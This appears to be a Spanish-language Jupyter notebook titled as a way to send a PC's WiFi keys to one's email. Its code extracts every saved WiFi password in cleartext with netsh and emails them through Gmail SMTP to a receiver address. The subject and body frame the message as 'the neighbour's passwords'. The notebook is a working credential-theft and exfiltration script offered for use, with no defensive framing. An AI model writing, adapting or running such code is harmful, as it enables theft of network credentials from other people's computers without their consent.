{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Enviar las claves de WiFi de una PC a tu correo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "#Obtenemos las redes almacenadas en el equipo\n",
    "from subprocess import check_output\n",
    "output = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\\n')\n",
    "profiles = [line.split(\":\")[1][1:-1] for line in output if (\"All User Profile\" in line or \"Perfil de todos los usuarios\" in line)] \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "#Extraemos las passwords de cada una de esas redes\n",
    "passwords = \"\"\n",
    "for network in profiles:\n",
    "    results = check_output(['netsh', 'wlan', 'show', 'profile',network, 'key=clear']).decode('utf-8').split('\\n')\n",
    "    results = [b.split(\":\")[1][1:-1] for b in results if (\"Key Content\" in b or  \"Contenido de la clave\" in b)] \n",
    "    passwords= passwords + (\"Red wifi: \" + network + \"     Contraseña: \"+ results[0]+\" <br/> \")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Activar esto temporalmente \n",
    "#https://myaccount.google.com/lesssecureapps \n",
    "#Luego lo vuelves a desactivar\n",
    "\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "import smtplib, ssl\n",
    "\n",
    "#Funcion para enviar el email\n",
    "def send_mail(subject,sender_email, receiver_email, html,sender_password):\n",
    "    message = MIMEMultipart(\"related\")\n",
    "    message[\"Subject\"] = subject\n",
    "    message[\"From\"] = 'correo@gmail.com'\n",
    "    message[\"To\"] = receiver_email\n",
    "    #Añadir contenido al mensaje\n",
    "    msgText = MIMEText(html, 'html')\n",
    "    message.attach(msgText)\n",
    "    # Crear una conexión segura entre el server y el correo\n",
    "    context = ssl.create_default_context()\n",
    "    with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465, context=context) as server:\n",
    "        server.login(sender_email, sender_password)\n",
    "        server.sendmail(sender_email, receiver_email, message.as_string())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Definimos los parametros y credenciales\n",
    "subject= '😈😈 Las passwords del vecino 😈😈'\n",
    "sender_email = \"sender.email@gmail.com\"\n",
    "sender_password = \"laclavedelsender\"\n",
    "receiver_email = \"receiver.email@gmail.com\"\n",
    "html = f\"\"\"\\\n",
    "    <html>\n",
    "    <body>\n",
    "        <span>Estas son las claves del vecino:\n",
    "        <br/>\n",
    "        {passwords}\n",
    "        </span>\n",
    "    </body>\n",
    "    </html>\n",
    "\"\"\"\n",
    "#Enviamos el correo\n",
    "send_mail(subject,sender_email,receiver_email,html,sender_password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "864b877cdd4102ec891bcc60c09678a900c6325089ee4076a5f0c1858e4ae179"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
